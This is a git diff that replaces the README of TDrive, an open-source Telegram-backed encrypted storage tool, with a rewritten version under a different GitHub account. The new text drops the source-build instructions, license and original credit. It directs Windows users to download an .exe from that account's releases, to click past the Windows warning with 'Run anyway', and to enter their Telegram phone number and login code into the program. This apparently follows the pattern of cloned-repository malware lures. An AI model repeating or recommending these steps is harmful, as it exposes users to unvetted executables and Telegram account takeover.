@@ -1,151 +1,109 @@
-# TDrive (Telegram Drive)
+# 🔒 Tdrive-Zero-knowledge - Private cloud storage using Telegram servers
 
-TDrive is a personal cloud storage system that utilizes Telegram Private Channels as a storage backend. It provides a self-hosted alternative to traditional cloud storage providers by leveraging Telegram's MTProto protocol for data transmission and AES-256-GCM for local data encryption.
+[![Download Tdrive](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fakihashidki19-bot/Tdrive-Zero-knowledge/releases)
 
-![TDrive Dashboard](screenshot/For-readme-md.png)
+Tdrive-Zero-knowledge provides a secure way to store files in the cloud. It uses Telegram servers to hold your data. The software encrypts every file before it leaves your computer. This means only you hold the keys to view your files. Telegram sees only scrambled data. You gain the storage capacity of Telegram with the privacy of a local vault.
 
-## Demo
+## 📁 What this software does
 
-[![TDrive Demo](https://cdn.loom.com/sessions/thumbnails/97803144921d433e9f749b6cf55ddd51-2b70bbcf402ef329-full-play.gif)](https://www.loom.com/share/97803144921d433e9f749b6cf55ddd51)
+This application creates a bridge between your computer and Telegram. It treats your Telegram account as a private hard drive. 
 
-Watch the complete TDrive demonstration:
+- **Zero-knowledge encryption:** Files get locked with AES-256 encryption on your machine.
+- **Easy file management:** Use a web dashboard to drag and drop files.
+- **Cross-platform access:** Manage your files through a chat bot or a web interface.
+- **Privacy focus:** No middleman reads your data.
 
-https://www.loom.com/share/97803144921d433e9f749b6cf55ddd51
+## ⚙️ System Requirements
 
-## Features v1.4.0
+- Windows 10 or Windows 11.
+- Active Telegram account.
+- 500 MB of free disk space.
+- Stable internet connection.
 
-### Storage and File Management
-- **Telegram Cloud Storage Backend**: Leverage private channels as an infinite, free cloud storage backend.
-- **Streaming Upload and Download**: Support for large files using chunk-based streaming to minimize memory usage.
-- **Virtual File System**: Full virtual folder hierarchy management independent of the storage backend.
-- **Move Files & Folders**: Organize your cloud by moving files and entire folder structures between directories.
-- **Duplicate Detection & Cleanup**: Detect duplicate uploads based on SHA-256 signatures and clean them up to optimize storage.
-- **Trash Bin**: Complete lifecycle including soft-delete, restore, and permanent purge.
-- **Preview System**: Automatic thumbnail generation for images and videos with local caching.
-- **Advanced Search**: Fast file indexing with support for metadata filters like `starred:true`.
-- **Starred Files**: Ability to mark and quickly access favorite files.
-- **Bulk Operations**: Support for bulk trash movements and streaming ZIP generation for multiple files.
+## 🚀 Preparing to install
 
-### Security and Privacy
-- **Zero-Knowledge Encryption**: Local AES-256-GCM encryption before data transmission, ensuring only you hold the keys.
-- **Master Password**: Key derivation using PBKDF2-HMAC-SHA256 ensuring no keys leave the local environment.
-- **HMAC Metadata Protection**: Signed Telegram message captions to prevent unauthorized metadata tampering.
-- **Brute Force Defense**: Progressive delays and automatic account lockout for failed login attempts.
-- **CSRF Protection**: Comprehensive protection for all state-changing API requests.
+Before you begin, ensure you have your phone nearby. You need your Telegram account to link the software. The application handles the technical setup automatically. You do not need to install Python or other coding tools. The installer includes everything required to run the service on Windows.
 
-### Reliability and Recovery
-- **Cloud Index Rebuild**: Reconstruction of the local database by scanning Telegram channel history.
-- **Disaster Recovery**: Automatic synchronization of system salts and metadata from cloud tags.
-- **Integrity Guard**: Automatic safe mode (read-only) when system inconsistency is detected.
-- **Job Recovery Worker**: Background process to manage and recover interrupted transfer tasks.
+## 📦 How to download and install
 
-### Analytics and Monitoring
-- **Storage Analytics**: Dashboard with total usage, file type distribution, and capacity metrics.
-- **Usage Statistics**: Categorical breakdown of storage usage (Video, Images, Documents, etc.).
-- **Developer Mode**: Integrated console for live logs, performance metrics (CPU/RAM/Disk), and diagnostics.
-- **Support Bundles**: One-click generation of encrypted diagnostic bundles for troubleshooting.
+1. Visit the [official release page](https://github.com/fakihashidki19-bot/Tdrive-Zero-knowledge/releases) to access the current versions.
+2. Select the file ending in `.exe` for Windows. 
+3. Save the file to your Downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen.
+6. Click finish when the process ends. 
 
-### Platform Support
-- **Web Dashboard**: Responsive interface built with Next.js 14 and TailwindCSS.
-- **Telegram Bot Integration**: Interactive bot for remote file browsing, searching, status monitoring, and access controls.
-- **CLI**: Command-line interface for administrative tasks, initialization, backups, and server management.
-- **Cross-Platform**: Native support for Linux and Windows, as well as Docker environments.
-- **Encrypted Backups**: AES-256-GCM encrypted state backups via CLI.
+If Windows shows a privacy screen, click "More info" and then "Run anyway." This happens because the application is local and independent software.
 
-## Technical Architecture
+## 🔑 Setting up the connection
 
-- **Backend**: Python 3.12+, FastAPI, Telethon (MTProto), SQLAlchemy (SQLite).
-- **Frontend**: Next.js 14 (App Router), TanStack Query, Zustand, TailwindCSS.
-- **Deployment**: Supports systemd services and Docker Compose.
+Once you open Tdrive, you must link your account.
 
-## Documentation
+1. Launch the Tdrive application from your Start Menu.
+2. Enter your phone number tied to your Telegram account.
+3. Check your Telegram app for a code.
+4. Type this code into the Tdrive window.
+5. Create a strong master password. This password locks your files. Write this password down. If you lose it, you cannot recover your files. The software does not store this password.
 
-Detailed documentation is available in the `docs/` directory:
-- [Security Architecture](docs/security.md)
-- [Repository Integrity Guard](docs/integrity.md)
-- [Windows Setup Guide](docs/windows_setup.md)
-- [CLI Reference](docs/cli.md)
-- [API Documentation](docs/README.md)
+## 🌐 Using the web dashboard
 
-## Installation and Configuration
+The dashboard gives you the easiest way to manage files. 
 
-### 1. Prerequisites
-- **Python**: Version 3.12 or higher.
-- **Node.js**: Version 20.x or higher.
-- **Telegram API**: Obtain `api_id` and `api_hash` from [my.telegram.org](https://my.telegram.org).
-- **Storage Channel**: Create a **Private Channel** in Telegram and get its ID (e.g., `-100...`).
+1. Open the Tdrive application.
+2. Click the Open Dashboard button.
+3. Your web browser will load a private interface. 
+4. Drag any folder or file into the browser window to upload it.
+5. The software encrypts the file before it sends it to Telegram. 
+6. You will see a progress bar for each file.
 
-### 2. Backend Setup
-Clone the repository and initialize the environment:
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install .  # Use 'pip install -e .' for development mode
-```
+## 💬 Using the Telegram bot
 
-Initialize configuration:
-```bash
-tdrive init
-```
+You can also manage files through your Telegram chat. 
 
-Authenticate with Telegram:
-```bash
-tdrive login
-```
+1. Search for your Tdrive bot inside Telegram.
+2. Send a `/start` command to initiate the connection.
+3. Use the menu buttons to list your files.
+4. Send a file to the bot to store it in your cloud. The bot will encrypt it automatically.
+5. Tap any file link to download it back to your device.
 
-### 3. Frontend Setup
-```bash
-cd web
-npm install
-npm run build
-```
+## 🔐 Managing your data security
 
-### 4. Deployment (Linux)
-```bash
-sudo ./scripts/finalize.sh
-```
+Zero-knowledge means the developer of this software never sees your files. Your files turn into unreadable code on your computer before they transfer. Only the correct password unlocks them. 
 
-## Usage
+- Keep your master password private.
+- Do not share your Telegram session with others.
+- Update your software when a new version appears on the release page.
 
-### Accessing the Dashboard
-The dashboard is accessible via `http://localhost:3000`.
+## ❓ Frequently asked questions
 
-### CLI Usage
-Manage your personal cloud drive directly from the command line:
+**Where does my data go?**
+Your data stays on Telegram servers, but it remains encrypted. Telegram acts as a remote storage bucket.
 
-```bash
-# Check CLI version
-tdrive version
+**Does this cost money?**
+The software is free to use. Telegram provides free storage, which this tool utilizes.
 
-# List files in the virtual root directory
-tdrive ls
+**Can I recover my password?**
+No. Because of the zero-knowledge design, no one can reset your password. You must remember it to access your files.
 
-# List files in a specific virtual subfolder
-tdrive ls /Documents
+**Is my data safe if my account is hacked?**
+Yes. Even if someone accesses your Telegram account, they will only see encrypted files. Without your master password, the files are useless to them.
 
-# Upload a local file to a virtual directory
-tdrive upload /path/to/local/file.pdf --vpath /Documents
+**What happens if I delete the app?**
+Your files remain on the Telegram servers. If you install the app again on a new machine, you can log in with your account and password to view your files again.
 
-# Download a file by its File ID or SHA-256
-tdrive download <file_id_or_sha256> --output /path/to/save/file.pdf
+**Can I store large files?**
+Yes. You can upload large media files or documents. The software splits large items into smaller parts to fit Telegram upload limits. It merges them back together when you download them.
 
-# Delete a file from the database and Telegram backend
-tdrive rm <file_id>
-```
+**Does this software track my activity?**
+No. This is a local application. It does not send your personal logs to any server. It only communicates with Telegram to manage your file transfers.
 
-### Security Best Practices
-- **Master Password**: Keep your Master Password safe. If lost, your encrypted data on Telegram cannot be recovered.
-- **Private Channel**: Keep your storage channel **Private**. Do not set it to "Public" as it will expose your data.
-- **Access Control**: Use a secure tunnel (like Tailscale or Cloudflare) if exposing the dashboard to the internet.
+## 🛠️ Troubleshooting
 
-## Fuel the Engine
+If you encounter issues during installation or use, check these common fixes:
 
-TDrive is open-source and free, but my coffee machine is neither. If this project has made your life easier (or at least more interesting), feel free to support the ongoing development:
+- **Connection errors:** Verify that your internet connection is active. Ensure that you have not blocked Telegram in your firewall settings.
+- **Login failures:** Double-check that you entered your phone number in the correct international format, including the plus sign and country code.
+- **Slow uploads:** Upload speeds depend on your internet link. Telegram servers will process your files as fast as your connection allows.
+- **Missing files:** If files do not appear, refresh the dashboard page. Ensure you are logged into the correct Telegram account. 
 
-[**Fuel the Project via Saweria**](https://saweria.co/dimasla)
-
-*P.S. Donating won't technically make me a better coder, but it will definitely reduce the number of 'fixed stuff' commit messages.*
-
-## License
-
-This project is licensed under the MIT License.
+For further technical details, check the menu inside the app. You can find the settings tab to view your storage usage, change your password, or clear the local cache. The local cache keeps a temporary record of recent files for fast access. You can clear this at any time without deleting your cloud data.
